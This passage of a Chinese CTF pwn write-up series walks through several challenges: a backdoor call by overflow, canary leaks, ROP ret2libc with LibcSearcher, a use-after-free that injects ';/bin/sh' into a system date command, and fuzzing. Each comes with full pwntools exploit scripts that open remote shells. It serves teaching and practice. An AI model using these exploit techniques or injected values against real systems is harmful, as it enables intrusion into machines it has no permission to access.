<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091600591.png" alt="image-20201216091600591">在主函数的最后是调用调用 (指针v3 + (v14 - 1))所指向的函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091711987.png" alt="image-20201216091711987"></p>
<p>整个for循环控制v14的值。</p>
<p>查看其他函数，发现一个后门函数。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091815706.png" alt="image-20201216091815706"></p>
<h4 id="思路及利用"><a href="#思路及利用" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>显然，目标就是执行后门函数。联想到v2可以溢出，那么第一个想法就是v2能否溢出修改v3的值。查看栈的结构，发现v2是可以溢出修改v3的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092006005.png" alt="image-20201216092006005"></p>
<p>接下来考虑v14的值，如果v14是1，那么就直接执行v3指向的函数，这是最方便的。要使v14为1，就需要不满足下列条件。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092221627.png" alt="image-20201216092221627"></p>
<p>“A”不符合条件。</p>
<p>没有开启pie，那么可以直接通过ida确定shell函数的地址。</p>
<p>最后编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">42685</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p32(<span class="number">0x80486CC</span>)<span class="comment">#v2与v3距离0x20</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;abcd&#x27;</span>)<span class="comment">#第一次输入无所谓</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093640287.png" alt="image-20201216093640287"></p>
<h3 id="2-Mary-Morton"><a href="#2-Mary-Morton" class="headerlink" title="2. Mary_Morton"></a>2. Mary_Morton</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180854344.png" alt="image-20201220180854344"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093833219.png" alt="image-20201216093833219"></p>
<p>开启了canary。</p>
<p><strong>考察知识点：格式化字符串、canary绕过、栈溢出</strong></p>
<h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序提供了两种漏洞，格式化字符串和栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094746428.png" alt="image-20201216094746428"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094805753.png" alt="image-20201216094805753"></p>
<p>同时也发现了后门函数<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094836014.png" alt="image-20201216094836014"></p>
<h4 id="思路及利用-1"><a href="#思路及利用-1" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>既然由栈溢出，那么最直接的思路就是通过栈溢出覆盖返回地址去执行后门函数。但是程序开启了canary，需要绕过。绕过的方法很多，考虑到给了格式化字符串，那么基本方向是利用格式化字符串泄露canary。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095700046.png" alt="image-20201216095700046">可以看出，canary是在ebp的上一个位置。          </p>
<p>那么接下来就是确定偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095859731.png" alt="image-20201216095859731"></p>
<p> (0x7fffffffdde8-0x7fffffffdd60)/8 = 17，由于是64位还有6个寄存器，所以偏移一共是17+6 = 23.</p>
<p>因此exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">52579</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%23$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x88</span> + p64(canary) + p64(<span class="number">0</span>) + p64(shell)<span class="comment">#栈溢出</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216100848549.png" alt="image-20201216100848549"></p>
<h3 id="3-warmup"><a href="#3-warmup" class="headerlink" title="3. warmup"></a>3. warmup</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180909635.png" alt="image-20201220180909635"></p>
<p><strong>考察知识点：fuzz</strong></p>
<p>这道题没有给附件，那么就是fuzz的题目了。</p>
<p>fuzz，也就是模糊测试。Fuzzing技术是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。</p>
<p>首先，先跑一下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202164645530.png" alt="image-20201202164645530"></p>
<p>可以看到给了一个地址。这道题难度系数不大，加上给了一个地址，因此猜测是简单的栈溢出。</p>
<p>编写脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分三种情况，不用地址，用32位地址，用64位地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">p,num,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*num</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">2</span>):</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43573</span>)</span><br><span class="line">                fuzz(p,i,j)</span><br><span class="line">                text = p.recv()</span><br><span class="line">                print(<span class="string">&#x27;text.len=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(text))+<span class="string">&#x27;text=&#x27;</span>+text)</span><br><span class="line">                print(<span class="string">&#x27;num=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; flag=&#x27;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">                p.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                p.close()</span><br><span class="line">                sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="4-welpwn"><a href="#4-welpwn" class="headerlink" title="4. welpwn"></a>4. welpwn</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180923482.png" alt="image-20201220180923482"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220181243613.png" alt="image-20201220181243613"></p>
<p><strong>考察知识点：滑栈、rop</strong></p>
<h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183006893.png" alt="image-20201220183006893"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183024184.png" alt="image-20201220183024184"></p>
<p>整个程序，逻辑是主函数获取输入，在echo函数中会将输入复制到s2中，再进行输出。主函数的输入范围远大于s2，可以做到栈溢出。</p>
<p>但是需要注意的是，在复制的for循环中，如果为<code>\x00</code>会使得判断语句为0，造成循环中断。</p>
<h4 id="思路及利用-2"><a href="#思路及利用-2" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>程序只开启了堆栈不可执行保护，同时没有调用过system函数，那么只有先泄露地址再进行rop。注意到for循环不能出现<code>\x00</code>，直接借助echo泄露地址的方法就不可行了，由于是小端序，返回地址的位数一致，覆盖返回地址是可行的。</p>
<p>但是，在主函数的输入的数据仍然是在主函数的栈中，因此可以覆盖echo函数的返回地址到主函数栈帧。要返回到主函数的栈帧，要么知道地址，要么用pop之类的语句。显然，获得栈帧地址不现实，那么就寻找pop语句。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220190823145.png" alt="image-20201220190823145"></p>
<p>可以发现，最多能够一次出栈4个，而在echo函数中，覆盖到返回地址也就是需要0x20个字节，也就是说主函数的栈帧与s2在栈上的位置也就相隔0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220191614222.png" alt="image-20201220191614222"></p>
<p>可以看到，s2复制的起始地址与buf相隔0x20.因此使用之前的pop语句之后，就可以跳过覆盖s2的字节，执行泄露代码。</p>
<p>利用puts函数泄露got地址，再返回到start。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">48838</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">sh = base +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(sh)+p64(system)+p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220194125391.png" alt="image-20201220194125391"></p>
<h3 id="5-monkey"><a href="#5-monkey" class="headerlink" title="5. monkey"></a>5. monkey</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108210709062.png" alt="image-20210108210709062"></p>
<p><strong>考察知识点：jshell绕过</strong></p>
<p>这次获取的附件比较奇怪</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165328947.png" alt="image-20201202165328947"></p>
<p>用ida打开js文件</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165908347.png" alt="image-20201202165908347"></p>
<p>发现完全看不懂是在干什么。</p>
<p>试着执行以下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202170029431.png" alt="image-20201202170029431"></p>
<p>感觉像是一个shell，这道题触及了我的知识盲区。</p>
<p>网上查找wp，才知道这是个jsshell。利用JavaScript的系统调用就行。</p>
<h3 id="6-time-formatter"><a href="#6-time-formatter" class="headerlink" title="6. time_formatter"></a>6. time_formatter</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165602237.png" alt="image-20201202165602237"></p>
<p><strong>考察知识点：堆漏洞——UAF</strong></p>
<h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><p>根据程序功能，将函数重命名。</p>
<p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171240776.png" alt="image-20201202171240776"></p>
<p>在set_time_format函数中，找到比较关键的输入函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171329588.png" alt="image-20201202171329588"></p>
<p>继续往下</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171507426.png" alt="image-20201202171507426"></p>
<p>这里值得注意的是strdup函数。</p>
<blockquote>
<p>定义函数：char * strdup(const char *s);</p>
<p>函数说明：strdup()会先用maolloc()配置与参数s 字符串相同的空间大小，然后将参数s字符串的内容复制到该内存地址，然后把该地址返回。该地址最后可以利用free()来释放。</p>
</blockquote>
<p>在设置时区的函数中，也发现了也会调用strdup函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171856179.png" alt="image-20201202171856179"></p>
<p>在退出函数中发现，是先free再询问是否退出。这里就有一个UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172023878.png" alt="image-20201202172023878"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172043020.png" alt="image-20201202172043020"></p>
<p>最后在打印函数中看到，command会包含format里的内容。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172125280.png" alt="image-20201202172125280"></p>
<p>也就是说，最终执行的是<code>system(/bin/date -d @unix_time &#39;format&#39;)</code>.因此，只要format里的内容是<code>&#39;;/bin/sh&#39;</code>就可以得到shell。</p>
<p>但是，注意到format输入会有一个检测函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172403191.png" alt="image-20201202172403191"></p>
<p>format只能包含”%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# “里的内容。</p>
<h4 id="思路及利用-3"><a href="#思路及利用-3" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>上面已经知道，需要将<code>&#39;;/bin/sh&#39;</code>写入format，就要绕过检查函数。有一个UAF漏洞可以利用。思路就很清晰了：</p>
<ul>
<li>随便输入一个format。</li>
<li>调用exit函数，但不退出。（这里没有输入时区，free掉一个空指针是可以的）</li>
<li>选择输入时区，这个时候向时区中输入也就是向之前的format输入。输入需要的<code>&#39;;/bin/sh&#39;</code>。</li>
<li>输入一个时间。（打印函数能成功执行）</li>
<li>执行打印函数。</li>
</ul>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;time_formatter&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">57804</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202173811503.png" alt="image-20201202173811503"></p>
<h3 id="7-pwn-200"><a href="#7-pwn-200" class="headerlink" title="7. pwn-200"></a>7. pwn-200</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204019066.png" alt="image-20201220204019066"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204110640.png" alt="image-20201220204110640"></p>
<p><strong>考察知识点：栈溢出、rop</strong></p>
<h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204324635.png" alt="image-20201220204324635"></p>
<p>主要函数很简单，就是一个输入函数。可以看到存在栈溢出漏洞。</p>
<h4 id="思路及利用-4"><a href="#思路及利用-4" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>因为开启了堆栈不可执行，所以shellcode不可行，考虑使用rop的方法。由于没有调用system函数，首先要泄露地址。</p>
<p>整个程序很简单，只需要简单的覆盖返回地址为write函数的plt即可。这里需要注意的是32位的传参方式与64位有所不同。</p>
<p>因此泄露函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)<span class="comment">#write(fd，addr,len)需要三个参数</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">31442</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn200&#x27;)</span></span><br><span class="line">efl = ELF(<span class="string">&#x27;pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220205838214.png" alt="image-20201220205838214"></p>
<h3 id="8-pwn1"><a href="#8-pwn1" class="headerlink" title="8. pwn1"></a>8. pwn1</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210407729.png" alt="image-20201220210407729"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210437478.png" alt="image-20201220210437478"></p>
<p><strong>考察知识点：puts函数泄露canary、栈溢出、rop</strong></p>
<h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210753716.png" alt="image-20201220210753716"></p>
<p>程序仍然十分简单，漏洞很明确就是栈溢出，堆栈不可执行，没有调用过system函数，基本思路<strong>pwn200</strong>一致，传参为64位又与<strong>welpwn</strong>类似。不过不同的是，保护中开启了canary，所以需要先泄露canary的值。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211118535.png" alt="image-20201220211118535">可以看出canary紧邻ebp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211219859.png" alt="image-20201220211219859"></p>
<h4 id="思路及利用-5"><a href="#思路及利用-5" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>因此，需要填充的垃圾数据为0x90-0x8 = 0x88。这里利用puts函数的特点，输入0x88个垃圾数据，将canary的值顺带输出。</p>
<p>传递参数需要一个<code>pop rdi ，ret</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211732114.png" alt="image-20201220211732114"></p>
<p>整个exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">57170</span>)</span><br><span class="line">prdi_addr=<span class="number">0x0400a93</span></span><br><span class="line">main_addr=<span class="number">0x0400908</span></span><br><span class="line">one_gadget_addr=<span class="number">0x45216</span></span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(prdi_addr)+p64(put_got)+p64(put_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">put_addr=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(put_addr)</span><br><span class="line">libc_base=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">flag=libc_base+one_gadget_addr</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(flag)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211938141.png" alt="image-20201220211938141"></p>
<h2 id="四分题"><a href="#四分题" class="headerlink" title="四分题"></a>四分题</h2><h3 id="9-note-service2"><a href="#9-note-service2" class="headerlink" title="9. note-service2"></a>9. note-service2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223457054.png" alt="image-20201123223457054"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211122155.png" alt="image-20210108211122155"></p>
<p><strong>考察知识点：数组越界、UAF</strong></p>
<h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><p>然后使用ida反编译。一边阅读一边修改函数名称，将整个过程走一遍。</p>
<p>其中只实现了add和delete。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223844741.png" alt="image-20201123223844741"></p>
<p>在add函数中，没有对index进行检查，因此可以通过输入index值基本实现将任意指针写到globle数组中。同时申请的chunk大小不能超过8字节，小于64位下chunk的最小值，实际分配的chunk每个用户数据大小是16字节（0x10）还有chunk头16字节。</p>
<p>对于获取输入的函数也有需要注意的地方：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224225947.png" alt="image-20201123224225947"></p>
<p>关于delete函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224310040.png" alt="image-20201123224310040"></p>
<h4 id="思路及利用-6"><a href="#思路及利用-6" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>首先值得注意的漏洞有两个，一个是数组的越界，一个是释放chunk后没有将指针置为null。但是由于题目限制了对chunk的写入数据大小，没法做到溢出，因此关于堆的攻击技巧基本上都不能用。</p>
